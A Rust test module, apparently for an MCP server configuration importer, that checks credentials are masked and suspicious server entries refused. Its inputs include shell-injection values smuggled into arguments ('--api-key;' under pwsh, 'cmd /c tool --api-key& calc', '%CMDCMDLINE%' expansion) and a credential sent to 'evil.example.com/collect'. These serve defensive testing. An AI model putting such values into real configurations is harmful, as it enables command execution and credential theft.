        }
        for name in ["script", "windows"] {
            let server = by_name(&servers, name);
            assert_eq!(server.shown(), format!("tls-mcp --key {MASK}"), "{name}");
            assert_eq!(server.refused, Some(Refusal::NamedValue), "{name}");
        }
        let relative = by_name(&servers, "relative");
        assert_eq!(relative.shown(), "tls-mcp --key ./client.key");
        assert!(!relative.hidden());
        assert_eq!(relative.refused, None);
    }

    /// No value is asked of the disk: a file and a directory that exist, and
    /// paths that name nothing, are judged alike under `--key`, `--key=`,
    /// `KEY=` and an address's `?api_key=`, each masked and imported (the
    /// maintainers' settlement after the narrow check: the existence rule
    /// reached the network through automounted and shared paths). The
    /// judging takes text alone; a break that asks the disk again tells the
    /// two apart. The paths are the crate's own, from the folder nextest runs
    /// a crate's tests in, so that no temporary folder's name (a space, a
    /// letter that is not ASCII) can make one more than a token (the short
    /// read of B, L7).
    #[test]
    fn a_value_is_judged_by_its_text_and_never_asked_of_the_disk() {
        let (file, dir) = ("src/import.rs", "src");
        let (gone_file, gone_dir) = ("src/missing.rs", "src/missing");
        for there in [file, dir] {
            assert!(
                std::path::Path::new(there).exists(),
                "{there} is where the tests run"
            );
        }
        for gone in [gone_file, gone_dir] {
            assert!(!std::path::Path::new(gone).exists(), "{gone} is not");
        }
        // Each server's row, by its name: what is shown, whether it hides a
        // value, and why it is refused.
        type Rows = std::collections::BTreeMap<String, (String, bool, Option<Refusal>)>;
        let judged = |value: &str| -> Rows {
            let text = serde_json::json!({"mcpServers": {
                "flag": {"command": "tls-mcp", "args": ["--key", value]},
                "joined": {"command": "tls-mcp", "args": [format!("--key={value}")]},
                "named": {"command": "env", "args": [format!("KEY={value}"), "tls-mcp"]},
                "address": {"url": format!("https://x.example.com/mcp?api_key={value}")}
            }})
            .to_string();
            servers_in(&text, false)
                .unwrap()
                .into_iter()
                .map(|server| {
                    let row = (server.shown(), server.hidden(), server.refused);
                    (server.name, row)
                })
                .collect()
        };
        let expected: Rows = [
            ("flag", format!("tls-mcp --key {MASK}")),
            ("joined", format!("tls-mcp --key={MASK}")),
            ("named", format!("env KEY={MASK} tls-mcp")),
            (
                "address",
                format!("https://x.example.com/mcp?api_key={MASK}"),
            ),
        ]
        .into_iter()
        .map(|(name, shown)| (name.to_owned(), (shown, true, None)))
        .collect();
        for (there, gone) in [(file, gone_file), (dir, gone_dir)] {
            assert_eq!(judged(there), expected, "{there}, which exists");
            assert_eq!(judged(gone), expected, "{gone}, which does not");
        }
    }

    /// A credential's name that holds anything but ASCII letters, digits,
    /// `-`, `_` and `.` is a script's text, and a token after it is masked
    /// and refuses its server, a flag's name, a `NAME=value`'s and an address
    /// field's alike: `pwsh -Command tool "--api-key;" C:/x.exe` runs the
    /// hidden path as a second statement, `cmd /c tool --api-key& calc` runs
    /// `calc`, and PowerShell runs `$API_KEY=…`'s right-hand side (the short
    /// read of B, M1, settled by the session: what refused before B).
    #[test]
    fn a_token_under_a_name_with_a_shells_character_refuses() {
        let servers = servers_in(
            r#"{"mcpServers": {
                "semicolon": {"command": "pwsh", "args": ["-Command", "tool", "--api-key;",
                    "C:/Tools/x.exe"]},
                "ampersand": {"command": "cmd", "args": ["/c", "tool", "--api-key&", "calc"]},
                "dollar": {"command": "pwsh", "args": ["-c", "$API_KEY=C:/Tools/x.exe"]},
                "field": {"url": "https://h.example.com/mcp?x;$api_key=C:/x.exe"},
                "argument": {"command": "pwsh", "args": ["-c", "start",
                    "https://h.example.com/?x;$api_key=C:/x.exe"]},
                "plain": {"command": "tool", "args": ["--api-key", "C:/Tools/x.exe",
                    "API_KEY=C:/x.exe", "https://h.example.com/?api_key=C:/x.exe"]}
            }}"#,
            false,
        )
        .unwrap();
        for (name, shown) in [
            ("semicolon", format!("pwsh -Command tool --api-key; {MASK}")),
            ("ampersand", format!("cmd /c tool --api-key& {MASK}")),
            ("dollar", format!("pwsh -c $API_KEY={MASK}")),
            (
                "field",
                format!("https://h.example.com/mcp?x;$api_key={MASK}"),
            ),
            (
                "argument",
                format!("pwsh -c start https://h.example.com/?x;$api_key={MASK}"),
            ),
        ] {
            let server = by_name(&servers, name);
            assert_eq!(server.shown(), shown, "{name}");
            assert_eq!(server.refused, Some(Refusal::NamedValue), "{name}");
        }
        let plain = by_name(&servers, "plain");
        assert_eq!(
            plain.refused,
            None,
            "a plain name's token: {}",
            plain.shown()
        );
        assert!(plain.hidden());
    }

    /// A value that holds `://` is never hidden whole, so that where a
    /// server connects shows, or refuses it: an address after a credential's
    /// flag, in its `NAME=value` and in a server's own address's field is
    /// masked and refuses (the short read of B, M2, settled by the session:
    /// what refused before B).
    #[test]
    fn an_address_under_a_credentials_name_refuses() {
        let servers = servers_in(
            r#"{"mcpServers": {
                "flag": {"command": "x-mcp", "args": ["--auth-server", "https://evil.example.com/collect"]},
                "named": {"command": "env", "args": ["API_KEY=https://h/x", "x-mcp"]},
                "own": {"url": "https://h.example.com/mcp?auth=https://evil.example.com/x"}
            }}"#,
            false,
        )
        .unwrap();
        for (name, shown) in [
            ("flag", format!("x-mcp --auth-server {MASK}")),
            ("named", format!("env API_KEY={MASK} x-mcp")),
            ("own", format!("https://h.example.com/mcp?auth={MASK}")),
        ] {
            let server = by_name(&servers, name);
            assert_eq!(server.shown(), shown, "{name}");
            assert_eq!(server.refused, Some(Refusal::NamedValue), "{name}");
        }
    }

    /// A name that ends in `helper`, `exec`, `program` or `plugin` names a
    /// program that gives a credential, and its value is shown (the short
    /// read of B, L3).
    #[test]
    fn a_program_named_by_helper_exec_program_or_plugin_is_shown() {
        let servers = servers_in(
            r#"{"mcpServers": {"x": {"command": "x-mcp", "args": [
                "--api-key-helper", "/tmp/get-key.sh", "--auth-helper", "/tmp/a.sh",
                "--token-helper", "/tmp/t.sh", "--auth-exec", "/usr/bin/get-token",
                "--auth-plugin", "gcp", "--key-program", "/opt/key"]}}}"#,
            false,
        )
        .unwrap();
        assert_eq!(
            servers[0].shown(),
            "x-mcp --api-key-helper /tmp/get-key.sh --auth-helper /tmp/a.sh --token-helper \
             /tmp/t.sh --auth-exec /usr/bin/get-token --auth-plugin gcp --key-program /opt/key"
        );
        assert!(!servers[0].hidden());
        assert_eq!(servers[0].refused, None);
    }

    /// In an argument of `cmd`, known by its file name in any case and any
    /// directory, a hidden token that holds a `/` is masked and refuses:
    /// `cmd` reads a switch wherever it is before its `/c` (`cmd --api-key
    /// /c start x` showed `cmd --api-key [redacted] start x`, and `/v:on`
    /// turns on `!NAME!` expansion). A token without one is imported, and
    /// under another program a `/` is a token's (the short read of B, L4).
    #[test]
    fn a_hidden_slash_in_an_argument_of_cmd_refuses() {
        let servers = servers_in(
            r#"{"mcpServers": {
                "switch": {"command": "cmd", "args": ["--api-key", "/c", "start", "x"]},
                "path": {"command": "C:\\Windows\\System32\\CMD.EXE", "args": ["--api-key", "/v:on",
                    "/c", "tool"]},
                "inside": {"command": "cmd.exe", "args": ["/c", "tool", "API_KEY=a/ccalc"]},
                "address": {"command": "Cmd", "args": ["/c", "start",
                    "https://h.example.com/?api_key=a/c"]},
                "plain": {"command": "cmd", "args": ["/c", "tool", "--api-key", "x7Kq9mPz2Lw4"]},
                "other": {"command": "/usr/local/bin/cmdx", "args": ["--api-key", "/c"]}
            }}"#,
            false,
        )
        .unwrap();
        for (name, shown) in [
            ("switch", format!("cmd --api-key {MASK} start x")),
            (
                "path",
                format!(r"C:\Windows\System32\CMD.EXE --api-key {MASK} /c tool"),
            ),
            ("inside", format!("cmd.exe /c tool API_KEY={MASK}")),
            (
                "address",
                format!("Cmd /c start https://h.example.com/?api_key={MASK}"),
            ),
        ] {
            let server = by_name(&servers, name);
            assert_eq!(server.shown(), shown, "{name}");
            assert_eq!(server.refused, Some(Refusal::NamedValue), "{name}");
        }
        for name in ["plain", "other"] {
            let server = by_name(&servers, name);
            assert_eq!(server.refused, None, "{name}: {}", server.shown());
            assert!(server.hidden(), "{name}");
        }
    }

    /// A `;` separates fields only where a field follows it: one inside a
    /// value stays there, and the value, no token, refuses its server; and
    /// an address in a field's value has its own fields masked (the narrow
    /// check).
    #[test]
    fn a_semicolon_in_a_value_stays_there_and_an_address_in_a_value_is_masked() {
        let servers = servers_in(
            r#"{"mcpServers": {
                "pass": {"url": "https://h.example.com/mcp?password=pa;ss"},
                "next": {"url": "https://h.example.com/mcp?next=https://o.example.com/cb?api_key=S1"}
            }}"#,
            false,
        )
        .unwrap();
        let pass = by_name(&servers, "pass");
        assert_eq!(
            pass.shown(),
            format!("https://h.example.com/mcp?password={MASK}")
        );
        assert_eq!(pass.refused, Some(Refusal::NamedValue));
        let next = by_name(&servers, "next");
        assert_eq!(
            next.shown(),
            format!("https://h.example.com/mcp?next=https://o.example.com/cb?api_key={MASK}")
        );
        assert_eq!(next.refused, None);
        assert!(next.hidden());
    }

    /// An address inside a field's value is looked into to a depth of
    /// three, a credential's there masked; one deeper is masked whole and
    /// refused, never drawn (the session's own read of the narrow check's
    /// fixes: looking in once drew a second address's `api_key`).
    #[test]
    fn an_address_too_deep_to_look_into_is_masked_whole_and_refused() {
        let servers = servers_in(
            r#"{"mcpServers": {
                "two": {"url": "https://h.example.com/mcp?a=https://o.example.com/?b=https://p.example.com/?api_key=S2"},
                "deep": {"url": "https://h.example.com/mcp?a=https://o/?b=https://p/?c=https://q/?d=https://r/?api_key=S4"}
            }}"#,
            false,
        )
        .unwrap();
        let two = by_name(&servers, "two");
        assert_eq!(
            two.shown(),
            format!(
                "https://h.example.com/mcp?a=https://o.example.com/?b=https://p.example.com/?api_key={MASK}"
            )
        );
        assert_eq!(two.refused, None);
        assert!(two.hidden());
        let deep = by_name(&servers, "deep");
        assert_eq!(
            deep.shown(),
            format!("https://h.example.com/mcp?a=https://o/?b=https://p/?c=https://q/?d={MASK}")
        );
        assert_eq!(deep.refused, Some(Refusal::NamedValue));
    }

    /// `%` is a token's only in an address's query or fragment, where it is
    /// percent-encoding: in an argument, `cmd /c` expands `%NAME%` before it
    /// splits at `&` (the final review).
    #[test]
    fn a_percent_is_a_tokens_only_in_an_address() {
        let servers = servers_in(
            r#"{"mcpServers": {
                "cmd": {"command": "cmd", "args": ["/c", "set", "API_KEY=%CMDCMDLINE:~-7%",
                    "x & calc"]},
                "echo": {"command": "cmd", "args": ["/c", "echo",
                    "https://h.example.com/?token=%CMDCMDLINE:~-7%", "x & calc"]},
                "remote": {"url": "https://x.example.com/mcp?api_key=abc%2Fdef"}
            }}"#,
            false,
        )
        .unwrap();
        let cmd = by_name(&servers, "cmd");
        assert_eq!(cmd.refused, Some(Refusal::NamedValue));
        // An address inside an argument is `cmd`'s to expand too (the narrow
        // check).
        let echo = by_name(&servers, "echo");
        assert_eq!(echo.refused, Some(Refusal::NamedValue), "{}", echo.shown());
        assert!(
            cmd.shown().contains(&format!("API_KEY={MASK}")),
            "{}",
            cmd.shown()
        );
        let remote = by_name(&servers, "remote");
        assert_eq!(
            remote.shown(),
            format!("https://x.example.com/mcp?api_key={MASK}")
        );
        assert!(remote.hidden());
        assert_eq!(remote.refused, None);
    }

    /// Where each argument begins and ends shows: one that is empty, or
    /// holds a space or a `"`, is quoted, its `"` and `\` escaped.
    #[test]
    fn every_arguments_bounds_show() {
        let servers = servers_in(
            r#"{"mcpServers": {"x": {"command": "C:\\Program Files\\x.exe",
                "args": ["two words", "", "say \"hi\"", "C:\\tools\\y", "plain"]}}}"#,
            false,
        )
        .unwrap();
        assert_eq!(
            servers[0].shown(),
            r#""C:\\Program Files\\x.exe" "two words" "" "say \"hi\"" C:\tools\y plain"#
        );
    }

    /// A control character or one that acts unseen, in a name, the program,
    /// an argument or an address, refuses the server; so does a name that
    /// cannot be a setting's.
    #[test]
    fn a_control_or_unseen_character_or_a_name_that_cannot_be_set_refuses_a_server() {
        let long = "n".repeat(MAX_NAME + 1);
        let longest = "n".repeat(MAX_NAME);
        let text = format!(
            r#"{{"mcpServers": {{
                "bell": {{"command": "run\u0007"}},
                "line": {{"command": "run", "args": ["a\nb"]}},
                "tab\there": {{"command": "run"}},
                "space": {{"url": "https://x.example.com/\u200bmcp"}},
                "": {{"command": "run"}},
                "{long}": {{"command": "run"}},
                "{longest}": {{"command": "run"}}
            }}}}"#
        );
        let servers = servers_in(&text, false).unwrap();
        for name in ["bell", "line", "tab\there", "space"] {
            assert_eq!(
                by_name(&servers, name).refused,
                Some(Refusal::Unseen),
                "{name:?}"
            );
        }
        assert_eq!(by_name(&servers, "").refused, Some(Refusal::Name));
        assert_eq!(by_name(&servers, &long).refused, Some(Refusal::Name));
        assert_eq!(by_name(&servers, &longest).refused, None);
    }

    /// At most [`MAX_SERVERS`] of a file's servers are given, and a file
    /// past the size read is refused whole.
    #[test]
    fn the_size_caps_hold() {
        let many: Vec<String> = (0..=MAX_SERVERS)
            .map(|n| format!("\"s{n:03}\": {{\"command\": \"run\"}}"))
            .collect();
        let text = format!("{{\"mcpServers\": {{{}}}}}", many.join(","));
        assert_eq!(servers_in(&text, false).unwrap().len(), MAX_SERVERS);
        let scratch = cineris_testkit::Scratch::outside("cineris-config-unit", "import_cap");
        let path = scratch.file("mcp.json", &text);
        let size = text.len() as u64;
        assert_eq!(
            read_servers_within(&path, size).unwrap().len(),
            MAX_SERVERS,
            "a file of the size read is read"
        );
        assert_eq!(
            read_servers_within(&path, size - 1),
            Err(ImportError::TooLarge)
        );
    }

    #[test]
    fn a_file_is_read_whole_or_not_at_all() {
        let scratch = cineris_testkit::Scratch::outside("cineris-config-unit", "import");
        let path = scratch.file("mcp.json", CLAUDE);
        assert_eq!(read_servers(&path).unwrap().len(), 6);
        assert!(matches!(
            read_servers(&scratch.join("missing.json")),
            Err(ImportError::Unreadable(_))
        ));
    }

    /// A token of no known format, under one name or another.
    const TOKEN: &str = "x7Kq9mPz2Lw4Rt8vB3nD";

    /// One server of `entry` (JSON, `VALUE` standing for [`TOKEN`]), read
    /// as a file's only server.
    fn one(entry: &str) -> ImportedServer {
        let entry = entry.replace("VALUE", TOKEN);
        let servers = servers_in(&format!(r#"{{"mcpServers": {{"s": {entry}}}}}"#), false)
            .unwrap_or_else(|error| panic!("{entry}: {error}"));
        servers.into_iter().next().unwrap()
    }

    /// A credential's name the list did not know, in any of its spellings,
    /// hides its value, which is imported as it is; `pwd` in an address's
    /// field is a password's (the step 25 fixes, the review: each of these
    /// was drawn whole by the first run, and imported).
    #[test]
    fn a_credentials_name_of_any_spelling_hides_its_value() {
        for (entry, shown) in [
            (
                r#"{"url": "https://db.example.com/mcp?user=me&pwd=VALUE"}"#,
                format!("https://db.example.com/mcp?user=me&pwd={MASK}"),
            ),
            (
                r#"{"url": "https://db.example.com/mcp?user=me&PWD=VALUE"}"#,
                format!("https://db.example.com/mcp?user=me&PWD={MASK}"),
            ),
            (
                r#"{"url": "https://db.example.com/mcp?user=me&pass=VALUE"}"#,
                format!("https://db.example.com/mcp?user=me&pass={MASK}"),
            ),
            (
                r#"{"url": "https://s.example.com/mcp?sv=2024-01-01&sig=VALUE"}"#,
                format!("https://s.example.com/mcp?sv=2024-01-01&sig={MASK}"),
            ),
            (
                r#"{"url": "https://s3.example.com/mcp?X-Amz-Signature=VALUE&X-Amz-Credential=VALUE"}"#,
                format!(
                    "https://s3.example.com/mcp?X-Amz-Signature={MASK}&X-Amz-Credential={MASK}"
                ),
            ),
            (
                r#"{"command": "db-mcp", "args": ["--passphrase", "VALUE", "--credential", "VALUE",
                    "--credentials=VALUE", "--bearer", "VALUE", "--cookie", "session=VALUE",
                    "--session", "VALUE", "--pw", "VALUE", "--pass", "VALUE", "--sig=VALUE",
                    "--signature", "VALUE", "--oauth", "VALUE"]}"#,
                format!(
                    "db-mcp --passphrase {MASK} --credential {MASK} --credentials={MASK} --bearer \
                     {MASK} --cookie {MASK} --session {MASK} --pw {MASK} --pass {MASK} \
                     --sig={MASK} --signature {MASK} --oauth {MASK}"
                ),
            ),
            (
                r#"{"command": "env", "args": ["DB_PASS=VALUE", "DB_PW=VALUE", "MYSQL_PWD=VALUE",
                    "PWD=/app", "db-mcp"]}"#,
                format!("env DB_PASS={MASK} DB_PW={MASK} MYSQL_PWD={MASK} PWD=/app db-mcp"),
            ),
            (
                r#"{"command": "x-mcp", "args": ["--api_key", "VALUE", "--apiKey", "VALUE",
                    "-api-key", "VALUE", "--API-KEY", "VALUE", "--APIKEY", "VALUE",
                    "--Api_Key=VALUE", "--token=VALUE", "--token", "VALUE", "-p", "8080:80"]}"#,
                format!(
                    "x-mcp --api_key {MASK} --apiKey {MASK} -api-key {MASK} --API-KEY {MASK} \
                     --APIKEY {MASK} --Api_Key={MASK} --token={MASK} --token {MASK} -p 8080:80"
                ),
            ),
            // The review of the fixes: a value that begins with `-`, a
            // header given as an argument, and a single letter's flag, which
            // names nothing and shows its value.
            (
                r#"{"command": "npx", "args": ["mcp-remote", "https://r.example.com/mcp",
                    "--header", "Authorization: Basic VALUE", "--header", "X-API-Key: VALUE",
                    "-H", "Cookie: session=VALUE", "--header=x-api-key:VALUE",
                    "--header", "Content-Type: application/json", "--api-key", "-VALUE",
                    "-k", "short-value"]}"#,
                format!(
                    "npx mcp-remote https://r.example.com/mcp --header \"Authorization: Basic \
                     {MASK}\" --header \"X-API-Key: {MASK}\" -H \"Cookie: {MASK}\" \
                     --header=x-api-key:{MASK} --header \"Content-Type: application/json\" \
                     --api-key {MASK} -k short-value"
                ),
            ),
        ] {
            let server = one(entry);
            assert_eq!(server.shown(), shown, "{entry}");
            assert!(server.hidden(), "{entry}: the row says a value is unseen");
            assert_eq!(server.refused, None, "{entry}: imported as it is");
        }
        for name in [
            "--passthrough",
            "--signal",
            "--sessions-dir",
            "--cookie-file",
            "PWD",
        ] {
            assert!(!names_a_secret(name, false), "{name}");
        }
        assert!(names_a_secret("pwd", true), "an address's field");
        // mcp-remote's form: the secret filter knows a bearer token, which
        // refuses the server as any known format does; the scheme stays in
        // view.
        let bearer = one(
            r#"{"command": "npx", "args": ["mcp-remote", "https://r.example.com/mcp",
                "--header", "Authorization: Bearer VALUE"]}"#,
        );
        assert!(!bearer.shown().contains(TOKEN), "{}", bearer.shown());
        assert!(bearer.shown().contains("Bearer"), "{}", bearer.shown());
        assert_eq!(bearer.refused, Some(Refusal::HoldsCredential));
    }

    /// An address with no scheme whose user part holds a password has that
    /// part masked and refuses its server, as one with a scheme does; text
    /// of the same look that is no such address is shown as it is (the
    /// step 25 fixes, the review).
    #[test]
    fn a_password_in_an_address_with_no_scheme_is_masked_and_refused() {
        for (args, shown) in [
            (
                r#"["--proxy", "me:VALUE@proxy.example.com:8080"]"#,
                format!("--proxy {MASK}@proxy.example.com:8080"),
            ),
            (
                r#"["--proxy=me:VALUE@10.0.0.1:3128"]"#,
                format!("--proxy={MASK}@10.0.0.1:3128"),
            ),
            (r#"["me:VALUE@localhost"]"#, format!("{MASK}@localhost")),
            (
                r#"["--dsn", "me:VALUE@tcp(db.internal:3306)/app"]"#,
                format!("--dsn {MASK}@tcp(db.internal:3306)/app"),
            ),
            (
                r#"["DATABASE=me:p@ss:VALUE@db.example.com/x"]"#,
                format!("DATABASE={MASK}@db.example.com/x"),
            ),
            (r#"["me:VALUE@[::1]:5432"]"#, format!("{MASK}@[::1]:5432")),
        ] {
            let server = one(&format!(r#"{{"command": "db-mcp", "args": {args}}}"#));
            assert_eq!(server.shown(), format!("db-mcp {shown}"), "{args}");
            assert_eq!(server.refused, Some(Refusal::HoldsCredential), "{args}");
        }
        for plain in [
            "git@github.com:org/repo",
            "me@example.com",
            "a:b",
            "time 10:30@home",
            "alpine:3.19@sha256:0123abcd",
            "npm:pkg@1.2.3",
            "npm:pkg@latest",
            "mailto:me@example.com",
            "ghcr.io/example/github-mcp:1.4@sha256:0123",
            "user:pass@",
            "x:y@notahost",
        ] {
            assert_eq!(without_bare_users(plain), None, "{plain}");
        }
    }

    /// An argument that is not text, or arguments that are not a list, is
    /// not a command line this version reads: the server is refused, and
    /// the argument is shown masked whole, never as its JSON (the step 25
    /// fixes, the review: `{"token": "…"}` was drawn and imported).
    #[test]
    fn an_argument_that_is_not_text_refuses_and_is_never_shown() {
        for args in [
            r#"[{"token": "VALUE"}]"#,
            r#"[["--api-key", "VALUE"]]"#,
            r#"["--verbose", 7]"#,
            r#""--api-key VALUE""#,
            r#"{"api-key": "VALUE"}"#,
        ] {
            let server = one(&format!(r#"{{"command": "db-mcp", "args": {args}}}"#));
            assert_eq!(server.refused, Some(Refusal::NotUnderstood), "{args}");
            assert!(server.shown().contains(MASK), "{args}: {}", server.shown());
            assert!(!format!("{server:?}").contains(TOKEN), "{args}");
        }
        let fine = one(r#"{"command": "db-mcp", "args": null}"#);
        assert_eq!(fine.refused, None);
    }

    /// A reference to a variable under a credential's name is refused as
    /// before (finding 23 of the review, left to a later step), and never
    /// drawn whole; a value given in the environment's or a header's own
    /// field is never read at all, whatever its name.
    #[test]
    fn a_reference_is_refused_as_before_and_a_fields_value_never_leaves() {
        for value in ["${SEARCH_API_KEY}", "$SEARCH_API_KEY"] {
            let server = one(&format!(
                r#"{{"command": "search-mcp", "args": ["--api-key", "{value}"]}}"#
            ));
            assert_eq!(server.refused, Some(Refusal::NamedValue), "{value}");
            assert_eq!(server.shown(), format!("search-mcp --api-key {MASK}"));
        }
        let server = one(
            r#"{"url": "https://h.example.com/mcp", "env": {"DB_PASS": "VALUE"},
                "headers": {"Cookie": "session=VALUE", "X-Api-Key": "VALUE"}}"#,
        );
        assert_eq!(server.env, ["DB_PASS"]);
        assert!(!format!("{server:?}").contains(TOKEN), "{server:?}");
    }

    /// Each header is given a variable of its own among the servers named
    /// together, whatever their names' punctuation, case or letters other
    /// than ASCII ones; never one of a provider's key, the configuration's
    /// own providers' included, nor one that begins `CINERIS_`, nor one a
    /// server takes from the environment by its own name; and never one
    /// that begins with a digit, which a shell cannot set (the step 25
    /// fixes, the review: `my-tracker` and `my_tracker` shared one, and
    /// `anthropic` with `api-key` was given `ANTHROPIC_API_KEY`).
    #[test]
    fn each_header_is_given_a_variable_of_its_own_and_none_of_the_harnesss() {
        let remote = |name: &str, headers: &[&str]| {
            let headers: Vec<String> = headers
                .iter()
                .map(|header| format!(r#""{header}": "VALUE""#))
                .collect();
            format!(
                r#""{name}": {{"url": "https://{}.example.com/mcp", "headers": {{{}}}}}"#,
                name.len(),
                headers.join(", ")
            )
        };
        let text = format!(
            r#"{{"mcpServers": {{{}, "docs": {{"url": "https://d.example.com/mcp",
                "env": {{"DOCS_TOKEN": "VALUE"}}, "headers": {{"Token": "VALUE"}}}}}}}}"#,
            [
                remote("my-tracker", &["Authorization"]),
                remote("my_tracker", &["Authorization"]),
                remote("MY.TRACKER", &["Authorization"]),
                remote("ñ-x", &["A"]),
                remote("ü-x", &["A"]),
                remote("github", &["Token"]),
                remote("anthropic", &["api-key", "auth_token"]),
                remote("openai", &["API_KEY"]),
                remote("openrouter", &["api-key"]),
                remote("cineris", &["config"]),
                remote("Cineris", &["Home"]),
                remote("1password", &["token"]),
                remote("x", &["X-Token", "X_Token"]),
            ]
            .join(", ")
        )
        .replace("VALUE", TOKEN);
        let mut servers = servers_in(&text, false).unwrap();
        let variable = |servers: &[ImportedServer], name: &str, header: &str| -> String {
            servers
                .iter()
                .find(|server| server.name == name)
                .unwrap()
                .headers
                .iter()
                .find(|found| found.name == header)
                .unwrap()
                .variable
                .clone()
        };
        let trackers: std::collections::BTreeSet<String> =
            ["my-tracker", "my_tracker", "MY.TRACKER"]
                .iter()
                .map(|name| variable(&servers, name, "Authorization"))
                .collect();
        assert_eq!(trackers.len(), 3, "{trackers:?}");
        assert!(
            trackers.contains("MY_TRACKER_AUTHORIZATION"),
            "{trackers:?}"
        );
        assert_ne!(
            variable(&servers, "ñ-x", "A"),
            variable(&servers, "ü-x", "A")
        );
        assert_eq!(variable(&servers, "github", "Token"), "GITHUB_TOKEN");
        assert_eq!(
            variable(&servers, "anthropic", "api-key"),
            "MCP_ANTHROPIC_API_KEY"
        );
        assert_eq!(
            variable(&servers, "anthropic", "auth_token"),
            "MCP_ANTHROPIC_AUTH_TOKEN"
        );
        assert_eq!(
            variable(&servers, "openai", "API_KEY"),
            "MCP_OPENAI_API_KEY"
        );
        assert_eq!(
            variable(&servers, "cineris", "config"),
            "MCP_CINERIS_CONFIG"
        );
        assert_eq!(variable(&servers, "Cineris", "Home"), "MCP_CINERIS_HOME");
        assert_eq!(
            variable(&servers, "1password", "token"),
            "MCP_1PASSWORD_TOKEN"
        );
        assert_eq!(variable(&servers, "docs", "Token"), "DOCS_TOKEN_2");
        assert_eq!(variable(&servers, "x", "X-Token"), "X_X_TOKEN");
        assert_eq!(variable(&servers, "x", "X_Token"), "X_X_TOKEN_2");
        // The configuration's own providers' keys, which this crate does
        // not know alone, in any case.
        assert_eq!(
            variable(&servers, "openrouter", "api-key"),
            "OPENROUTER_API_KEY"
        );
        HeaderVariables::new(["openrouter_api_key"]).name(&mut servers);
        assert_eq!(
            variable(&servers, "openrouter", "api-key"),
            "MCP_OPENROUTER_API_KEY"
        );
        // Named again, apart from another file's servers, read before.
        let mut later = servers_in(
            &format!(
                r#"{{"mcpServers": {{{}}}}}"#,
                remote("my-tracker", &["Authorization"])
            ),
            false,
        )
        .unwrap();
        let mut variables = HeaderVariables::default();
        variables.take(&servers);
        variables.name(&mut later);
        assert!(
            !trackers.contains(&variable(&later, "my-tracker", "Authorization")),
            "{later:?}"
        );
        // Every one of them can be written, and reads back, but the two
        // whose names hold letters other than ASCII ones, which since step
        // 30 cannot be a server's (the dynamic-tool registry's rule).
        let importable: Vec<ImportedServer> = servers
            .iter()
            .filter(|server| server.refused.is_none())
            .cloned()
            .collect();
        assert_eq!(importable.len(), servers.len() - 2, "{servers:?}");
        for name in ["ñ-x", "ü-x"] {
            let refused = servers.iter().find(|server| server.name == name);
            assert_eq!(
                refused.and_then(|server| server.refused),
                Some(Refusal::Name)
            );
        }
        crate::write::user_config_text(&crate::write::FirstRunChoices {
            imports: Some(crate::write::Imports {
                servers: importable,
                ..crate::write::Imports::default()
            }),
            ..crate::write::FirstRunChoices::default()
        })
        .expect("written");
    }

    /// The `Debug` forms of a server, its launch, and the first run's
    /// choices that hold them, show what the first run shows, never a value
    /// it hides (the review of the step 25 fixes: the derived form printed
    /// a token under a credential's name whole).
    #[test]
    fn a_servers_debug_form_hides_what_the_first_run_hides() {
        let servers = servers_in(
            &r#"{"mcpServers": {
                "search": {"command": "search-mcp", "args": ["--api-key", "VALUE"]},
                "remote": {"url": "https://h.example.com/mcp?token=VALUE"}
            }}"#
            .replace("VALUE", TOKEN),
            false,
        )
        .unwrap();
        let choices = crate::write::FirstRunChoices {
            imports: Some(crate::write::Imports {
                servers: servers.clone(),
                ..crate::write::Imports::default()
            }),
            ..crate::write::FirstRunChoices::default()
        };
        for printed in [
            format!("{servers:?}"),
            format!("{servers:#?}"),
            format!("{:?}", servers[0].launch),
            format!("{choices:?}"),
        ] {
            assert!(!printed.contains(TOKEN), "{printed}");
            assert!(printed.contains(MASK), "{printed}");
        }
        assert!(
            matches!(&servers[0].launch, Launch::Remote { url } if url.contains(TOKEN)),
            "the server is still imported as it is"
        );
    }

    /// At write time the servers picked from every file have their headers'
    /// variables settled together: a header keeps what its row showed unless
    /// another picked server takes that name from its environment, or
    /// another header kept it first (the review of the step 25 fixes:
    /// `tracker`'s `Token` and another file's `tracker-cli`, which takes
    /// `TRACKER_TOKEN`).
    #[test]
    fn the_servers_picked_have_their_variables_settled_together() {
        let mut claude = servers_in(
            r#"{"mcpServers": {"tracker": {"url": "https://tracker.example.net/mcp",
                "headers": {"Token": "x"}}, "kept": {"url": "https://k.example.net/mcp",
                "headers": {"Token": "x"}}}}"#,
            false,
        )
        .unwrap();
        let cursor = servers_in(
            r#"{"mcpServers": {"tracker-cli": {"command": "tracker", "env": {"TRACKER_TOKEN": "x"}},
                "kept": {"url": "https://k2.example.net/mcp", "headers": {"Token": "x"}}}}"#,
            false,
        )
        .unwrap();
        assert_eq!(claude[1].headers[0].variable, "TRACKER_TOKEN");
        claude.extend(cursor);
        let mut picked: Vec<ImportedServer> = claude
            .into_iter()
            .filter(|server| {
                server.name != "kept"
                    || matches!(&server.launch, Launch::Remote { url } if url.contains("k2."))
            })
            .collect();
        HeaderVariables::new(["Anything_Else"]).settle(&mut picked);
        let tracker = picked
            .iter()
            .find(|server| server.name == "tracker")
            .unwrap();
        assert_eq!(tracker.headers[0].variable, "TRACKER_TOKEN_2");
        let kept = picked.iter().find(|server| server.name == "kept").unwrap();
        assert_eq!(
            kept.headers[0].variable, "KEPT_TOKEN",
            "what its row showed"
        );
        crate::write::user_config_text(&crate::write::FirstRunChoices {
            imports: Some(crate::write::Imports {
                servers: picked,
                ..crate::write::Imports::default()
            }),
            ..crate::write::FirstRunChoices::default()
        })
        .expect("written");
    }
}
